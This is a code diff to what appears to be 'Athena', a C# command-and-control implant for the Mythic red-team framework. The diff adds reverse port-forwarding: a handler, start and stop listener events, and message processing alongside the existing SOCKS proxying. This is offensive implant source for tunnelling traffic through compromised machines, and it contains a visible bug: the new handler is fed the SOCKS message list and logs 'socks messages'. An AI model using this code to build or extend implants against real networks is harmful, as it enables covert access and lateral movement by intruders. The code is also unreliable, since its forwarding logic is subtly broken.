@@ -26,6 +26,7 @@ namespace Athena
         public IProfile profile { get; set; }
         public CommandHandler commandHandler { get; set; }
         public SocksHandler socksHandler { get; set; }
+        public RPortFwdHandler rportfwdHandler { get; set; }
         public ForwarderHandler forwarderHandler { get; set; }
         public bool exit { get; set; }
         List<IProfile> availableProfiles { get; set; }
@@ -35,6 +36,7 @@ namespace Athena
             this.availableProfiles = GetProfiles();
             this.profile = SelectProfile(0);
             this.socksHandler = new SocksHandler();
+            this.rportfwdHandler = new RPortFwdHandler();
             this.commandHandler = new CommandHandler();
             this.forwarderHandler = new ForwarderHandler();
             this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
@@ -44,6 +46,20 @@ namespace Athena
             this.commandHandler.SetProfile += SetProfile;
             this.commandHandler.ListForwarders += ListForwarders;
             this.commandHandler.ListProfiles += ListProfiles;
+            this.commandHandler.StartRportFwd += StartRportFwd;
+            this.commandHandler.StopForwarder += StopRportFwd;
+        }
+
+        private void StopRportFwd(object sender, TaskEventArgs e)
+        {
+            var dict = Misc.ConvertJsonStringToDict(e.job.task.parameters);
+            this.rportfwdHandler.StopListener(int.Parse(dict["lport"]));
+        }
+
+        private void StartRportFwd(object sender, TaskEventArgs e)
+        {
+            this.rportfwdHandler.StartListener(e.job);
+
         }
 
         /// <summary>
@@ -176,6 +192,20 @@ profiles.Add("Athena.Profiles.SMB");
                 {
                     Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.socks.Count} socks messages.");
                     HandleSocks(args.tasking_response.socks);
+                }
+                catch (Exception e)
+                {
+                    Debug.WriteLine(e.ToString());
+
+                }
+            }
+            
+            if (args.tasking_response.rpfwd is not null)
+            {
+                try
+                {
+                    Debug.WriteLine($"[{DateTime.Now}] Handling {args.tasking_response.rpfwd.Count} socks messages.");
+                    HandleRpFwd(args.tasking_response.socks);
                 }
                 catch (Exception e)
                 {
@@ -455,15 +485,17 @@ profiles.Add("Athena.Profiles.SMB");
             {
                 await this.socksHandler.HandleMessage(sm);
             }
-            //Parallel.ForEach(socks, sm =>
-            //{
-            //    Task.Run(() =>
-            //    {
-            //        this.socksHandler.HandleMessage(sm);
-            //    });
-            //});
-
             this.socksHandler.GetSocksMessages();
+        }
+
+        private async Task HandleRpFwd(List<MythicDatagram> rportfwd)
+        {
+            foreach (var sm in rportfwd)
+            {
+                await this.rportfwdHandler.HandleMessage(sm);
+            }
+
+            this.rportfwdHandler.GetRportFwdMessages();
         }
 
         /// <summary>
